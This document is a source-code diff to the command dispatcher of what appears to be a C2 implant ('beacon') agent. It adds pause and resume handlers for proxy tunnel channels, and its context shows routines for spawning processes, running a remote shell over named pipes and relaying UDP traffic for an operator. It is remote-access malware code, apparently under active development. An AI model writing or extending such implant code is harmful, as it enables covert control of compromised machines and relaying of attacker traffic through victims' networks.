@@ -1,13 +1,13 @@
 #include "Commander.h"
 #include "Boffer.h"
 
-void* Commander::operator new(size_t sz)
+void* Commander::operator new(size_t sz) 
 {
 	void* p = MemAllocLocal(sz);
 	return p;
 }
 
-void Commander::operator delete(void* p) noexcept
+void Commander::operator delete(void* p) noexcept 
 {
 	MemFreeLocal(&p, sizeof(Commander));
 }
@@ -121,6 +121,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_TUNNEL_WRITE_UDP:
 			this->CmdTunnelMsgWriteUDP(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_TUNNEL_PAUSE: 
+			this->CmdTunnelMsgPause(CommandId, inPacker, outPacker); break;
+		
+		case COMMAND_TUNNEL_RESUME: 
+			this->CmdTunnelMsgResume(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_TUNNEL_CLOSE:
 			this->CmdTunnelMsgClose(CommandId, inPacker, outPacker); break;
@@ -806,7 +812,7 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (progOutput) {
 		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 		ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
-
+		
 		spi.hStdError  = pipeWrite;
 		spi.hStdOutput = pipeWrite;
 		spi.hStdInput  = NULL;
@@ -914,10 +920,10 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 
 	HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, FILE_WRITE_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-
+	
 	r1 = GenerateRandom32();
 	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
-
+	
 	HANDLE beaconInPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellInPipe  = ApiWin->CreateFileA(pipeName, FILE_READ_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
@@ -960,7 +966,7 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 	}
 }
 
-void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker)
+void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker) 
 {
 	ULONG jobId = inPacker->Unpack32();
 	ULONG dataSize = 0;
@@ -1024,6 +1030,18 @@ void Commander::CmdTunnelMsgWriteUDP(ULONG commandId, Packer* inPacker, Packer* 
 	ULONG taskId = inPacker->Unpack32();
 
 	this->agent->proxyfire->ConnectWriteUDP(channelId, data, dataSize);
+}
+
+void Commander::CmdTunnelMsgPause(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectPause(channelId);
+}
+
+void Commander::CmdTunnelMsgResume(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectResume(channelId);
 }
 
 void Commander::CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* outPacker)
